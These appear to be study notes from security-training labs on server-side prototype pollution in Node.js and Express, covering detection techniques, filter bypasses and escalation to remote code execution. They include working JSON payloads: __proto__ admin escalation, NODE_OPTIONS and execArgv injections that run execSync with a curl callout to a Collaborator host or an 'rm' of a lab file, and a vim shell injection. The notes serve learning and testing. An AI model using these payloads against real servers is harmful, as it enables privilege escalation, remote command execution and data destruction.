# Server-side prototype pollution

More difficult to detect:

* No source code access
* Lack of developer tools (only applies to black box testing)
* DoS problem
* Pollution persistence: when tested in a browser, can reverse changes and get a clean environment by refreshing. On server-side it persists for the lifetime of the node process.

## Detecting via polluted property reflection

Developers can forget that JS for...in loop itereates all porperties, included inherited ones via prototype chain (doesn't inclide built-in properties set by JS native constructors)

`const myObject = { a: 1, b: 2 };`

pollute the prototype with an arbitrary property

`Object.prototype.foo = 'bar';`

confirm myObject doesn't have its own foo property

`myObject.hasOwnProperty('foo');` // false

list names of properties of myObject
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
for(const propertyKey in myObject){
    console.log(propertyKey);
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Output: a, b, foo


Also applies to arrays: 

const myArray = ['a','b'];
Object.prototype.foo = 'bar';
for(const arrayKey in myArray){
    console.log(arrayKey);
}
// Output: 0, 1, foo

Good candidates are POST / PUT that submit JSON
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /user/update HTTP/1.1
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "admin":true
    }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Response:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### Example:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{"address_line_1":"Wiener1 HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"5NL1tc3YRZKtWR3Ky9xpECoQbNlLfT5k",
"__proto__":{
        "isAdmin":true
    }}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Detecting server-side prototype pollution without polluted property reflection

Most of the time with server pollution, will not get a reflected response.

Can try properties that potentially match server config.

Techniques:

* Status code override
* JSON spaces override
* Charset override

## Status code override

Server side frameworks like Express allow to set custom statuses. If error, then response may issue generic answer with en error object.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Node's http-errors contains  the following function:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    
If the developers haven't set a status property for the error, you can potentially use this to probe for prototype pollution as follows:

1. Find a way to trigger an error response and take note of the default status code.
2. Try polluting the prototype with your own status property. Be sure to use an obscure status code that is unlikely to be issued for any other reason.
3. Trigger the error response again and check whether you've successfully overridden the status code.

*Must choose a status code in the 400-599 range, otherwise Node defaults a 500.

## JSON spaces override

Express framework has json spaces, to configure number of spaces to indent JSON data in the response. If left with the default, it can have pollution via the prototype chain.

If got access to a JSON response, then can try polluting the prototype with your own json spaces property, the resissue the request to see if indentation increases (same to decrease).

It has been fixed in Express 4.17.4, but websites that haven't upgraded may still be vulnerable.

To see it in burp, need to put in raw, to correctly see indentation.

## Charset override

Express servers have “middleware” to process requests before giving to the correct handler. `body-parser` on requests to generate `req.body`. This contains another gadet for prototype pollution.

The following code, passes object into the `read()` function, used to read in request body to parse. There is encoding, gets `getCharset(req)` or defaults `UTF-8`. 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
var charset = getCharset(req) or 'utf-8'
function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}
read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### Example:

If can find an object with properties visible in responses, can use it to probe for sources. Ex. using `UTF-7` and JSON source:

1. Add arbitrary `UTF-7` string foo in `UTF-7` is +AGYAbwBv-.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
2. Send request, servers won't use `UTF-7` by default, so the strings should appear in the encoded form.

3. Pollute with a content-type to specify `UTF-7`
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
4. Repeat the request and the response should contain the decoded `UTF-7` string.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
There is a bug on Node's `_http_incoming` module, even if `Conten-Type` header includes the charset.

`_addHeaderLine()` checks that no property already exists before trasnfering properties to an `IncomingMessage` object.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
It includes properties inherited from prototype chain, then can pollute prototype with the content-type property.

## Scanning for server-side prototype pollution sources

1. Server-Side Prototype Pollution Scanner extension and enable
2. Explore website
3. On history filter by scope, select all and send to extension, maybe change config and OK.

It will be reported on the Issue activity on Dashboard and Target

In community edition: monitor Output tab

## Bypassing input filters for server-side prototype pollution

Websites try to prevent filtering `__proto__`

It can be bypassed: obfuscate prohibited keywords or access via the constructor instead of `__proto__`

Node applications can delete or disable `__proto__` using flags `--disable-proto=delete` or `--disable-proto=throw` respectively. It can also be bypassed with the constructor.

### Example:

constructor + spaces override

See the normal request in raw tab
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"constructor":{"prototype" :{
"json spaces":10}
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Then check identation in raw tab
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"constructor":{"prototype" :{
"isAdmin":true}
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Remote code execution via server-side prototype pollution

Client-side prototype pollution tipically exposes vulnerable site to DOM XSS, server-side pollution can result in RCE

Node has a lot of potential command execution sinks, many occur in `child_process` module, which are often invoked by an asynchronous request that is pollutable. Can use collaborator.

`NODE_OPTIONS` environment defines command-line arguments for starting a Node process. Since is an env object, it can have prototype pollution.

`shell` property enables to run commands, together with `NODE_OPTIONS` causes interaction with Collaborator, whenever a Node process is created
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*Scape quotes are not necesary, but can help reduce false positives obfuscating hostname to evade WAFs

## Remote code execution via child_process.fork()

`child_process.spawn()` and `child_process.fork()` create Node subprocesses. `fork()` accepts options object with a potential option `execArgv` property. If developers left it undefined, then can be polluted.

It allows to controll command-line args, otherwise not possible with `NODE_OPTIONS`.

`--eval` argument
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"execArgv": [
    "--eval=require('<module>')"
]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In addition to `fork()`, the `child_process` module contains the `execSync()` method, which executes arbitrary string as system command.

### Example:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
## Remote code execution via child_process.execSync()

Like `fork()`, the `execSync()` method also accepts options object, which can be pollutable. Although doesn't accept `execArgv` property, can still inject commands in a child process polluting both `shell` and input properties.

input option is a string passed to child process, and executed as system by `execSync()`. there are options for providing the command (ex. passing it as argument to the function), input may be left undefined.

`shell` option allows to specify shell. Defult, `execSync()` uses system's defaul shell to run commands, so can also be undefined.


Polluting these 2 properties, could override the command that the app intended to execute.

`shell` only accepts the name and not set any command/line args.

`shell` is executed with -c which for most shells is command by string, but for Node it runs a syntax check on the script, which prevents execution. There are workarounds.

`input` property containing payload is passed via stdin, the shell must accept commands from stdin.

## VIM
vim on server can lead to RCE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"shell":"vim",
"input":":! <command>\n"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*Vim has an interactive prompt and expects the user to hit Enter to run the provided command, simulated with `\n`


Some tools don't read from stdin by default, there are ways around this. `Curl` can read stdin and send contests as the body of a POST using `-d @- argument`.

Other cases can use xargs, converting stdin to args to be passed to a command.
